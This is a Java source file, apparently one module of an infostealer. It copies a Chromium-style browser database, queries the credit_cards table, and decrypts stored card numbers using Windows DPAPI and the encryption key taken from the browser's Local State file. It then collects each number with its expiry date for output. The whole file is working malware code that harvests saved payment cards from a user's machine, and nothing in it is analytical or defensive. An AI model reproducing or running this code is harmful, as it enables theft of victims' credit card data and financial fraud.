package _256.utils.decrypt.creditcards;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

import com.github.windpapi4j.WinDPAPI;
import com.github.windpapi4j.WinDPAPI.CryptProtectFlag;

import _256.utils.decrypt.DecryptUtil;

public class CreditCardsDecrypt {

	private File CARD_PATH = null;
	private File LOCAL_STATE_PATH = null;
	public List<String> CARDS;

	public CreditCardsDecrypt(String path0, String path1) {
		this.CARD_PATH = new File(path0);
		this.LOCAL_STATE_PATH = new File(path1);
		this.CARDS = new ArrayList<String>();
	}

	public String getData() {
		StringBuilder temp = new StringBuilder();
		CARDS.stream().forEach(cc -> temp.append(cc + "\n"));
		return temp.toString();
	}

	public CreditCardsDecrypt getCards() {
		HashSet<CreditCards> CARDS = new HashSet<>();
		Connection connection = null;
		File tempFile = null;
		try {
			tempFile = new File(UUID.randomUUID().toString());
			FileUtils.copyFile(this.CARD_PATH, tempFile);
			Class.forName("org.sqlite.JDBC");
			connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
			Statement statement = connection.createStatement();
			statement.setQueryTimeout(30);
			ResultSet resultSet = statement.executeQuery("SELECT * FROM credit_cards");
			while (resultSet.next()) {
				parseCards(tempFile, "", CARDS, resultSet);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			try {
				if (connection != null) {
					connection.close();
				}
			} catch (Exception e) {
			}
		}
		tempFile.delete();
		return this;
	}

	private void parseCards(File cardStore, String name, HashSet<CreditCards> cardSet, ResultSet resultSet) throws SQLException {
		String ccnum = decrypt(resultSet.getBytes(5));
		String expyr = resultSet.getString(4);
		String expmn = resultSet.getString(3);
		if (ccnum != null) {
			String format = "Credit Card Number: " + ccnum + "\nExpires: " + expmn + "/" + expyr + "\n";
			CARDS.add(format);
		}
	}

	private String decrypt(byte[] encryptedBytes) {
		byte[] decryptedBytes = null;
		byte[] encryptedValue = encryptedBytes;
		try {
			boolean isV10 = new String(encryptedValue).startsWith("v10");
			if (WinDPAPI.isPlatformSupported()) {
				WinDPAPI winDPAPI = WinDPAPI.newInstance(CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
				if (!isV10) {
					decryptedBytes = winDPAPI.unprotectData(encryptedValue);
				} else {
					if (!LOCAL_STATE_PATH.exists()) {
						throw new IllegalArgumentException("Local State is required");
					}
					String localState = FileUtils.readFileToString(LOCAL_STATE_PATH);
					JSONObject jsonObject = new JSONObject(localState);
					String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
					byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBase64);
					if (!new String(encryptedKeyBytes).startsWith("DPAPI")) {
						throw new IllegalStateException("Local State should start with DPAPI");
					}
					encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length);
					byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
					if (keyBytes.length != 256 / 8) {
						throw new IllegalStateException("Local State key length is wrong");
					}
					byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "V10".length(), "V10".length() + 96 / 8);
					encryptedValue = Arrays.copyOfRange(encryptedValue, "V10".length() + 96 / 8, encryptedValue.length);
					decryptedBytes = DecryptUtil.getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
				}
			}
		} catch (Exception e) {
			return null;
		}
		if (decryptedBytes == null) {
			return null;
		} else {
			return new String(decryptedBytes);
		}
	}
}
